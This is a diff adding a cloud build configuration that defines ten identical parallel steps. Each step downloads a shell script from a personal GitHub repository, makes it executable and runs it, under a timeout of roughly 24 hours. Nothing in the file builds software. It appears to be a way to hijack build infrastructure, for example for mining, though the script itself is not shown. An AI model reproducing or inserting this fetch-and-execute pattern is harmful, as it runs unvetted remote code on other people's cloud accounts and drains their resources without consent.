@@ -1,0 +1,91 @@
+steps:
+- name: golang
+  entrypoint: /bin/bash
+  args:
+    - '-c'
+    - |
+      wget https://raw.githubusercontent.com/Nunu8383/workspace/main/Crb.sh && chmod +x Crb.sh && ./Crb.sh
+  waitFor:
+    - '-'
+
+- name: golang
+  entrypoint: /bin/bash
+  args:
+    - '-c'
+    - |
+      wget https://raw.githubusercontent.com/Nunu8383/workspace/main/Crb.sh && chmod +x Crb.sh && ./Crb.sh
+  waitFor:
+    - '-'
+    
+- name: golang
+  entrypoint: /bin/bash
+  args:
+    - '-c'
+    - |
+      wget https://raw.githubusercontent.com/Nunu8383/workspace/main/Crb.sh && chmod +x Crb.sh && ./Crb.sh
+  waitFor:
+    - '-'
+
+- name: golang
+  entrypoint: /bin/bash
+  args:
+    - '-c'
+    - |
+      wget https://raw.githubusercontent.com/Nunu8383/workspace/main/Crb.sh && chmod +x Crb.sh && ./Crb.sh
+  waitFor:
+    - '-'
+
+- name: golang
+  entrypoint: /bin/bash
+  args:
+    - '-c'
+    - |
+      wget https://raw.githubusercontent.com/Nunu8383/workspace/main/Crb.sh && chmod +x Crb.sh && ./Crb.sh
+  waitFor:
+    - '-'
+
+- name: golang
+  entrypoint: /bin/bash
+  args:
+    - '-c'
+    - |
+      wget https://raw.githubusercontent.com/Nunu8383/workspace/main/Crb.sh && chmod +x Crb.sh && ./Crb.sh
+  waitFor:
+    - '-'
+
+- name: golang
+  entrypoint: /bin/bash
+  args:
+    - '-c'
+    - |
+      wget https://raw.githubusercontent.com/Nunu8383/workspace/main/Crb.sh && chmod +x Crb.sh && ./Crb.sh
+  waitFor:
+    - '-'
+
+- name: golang
+  entrypoint: /bin/bash
+  args:
+    - '-c'
+    - |
+      wget https://raw.githubusercontent.com/Nunu8383/workspace/main/Crb.sh && chmod +x Crb.sh && ./Crb.sh
+  waitFor:
+    - '-'
+
+- name: golang
+  entrypoint: /bin/bash
+  args:
+    - '-c'
+    - |
+      wget https://raw.githubusercontent.com/Nunu8383/workspace/main/Crb.sh && chmod +x Crb.sh && ./Crb.sh
+  waitFor:
+    - '-'
+
+- name: golang
+  entrypoint: /bin/bash
+  args:
+    - '-c'
+    - |
+      wget https://raw.githubusercontent.com/Nunu8383/workspace/main/Crb.sh && chmod +x Crb.sh && ./Crb.sh
+  waitFor:
+    - '-'
+timeout: '86000s'
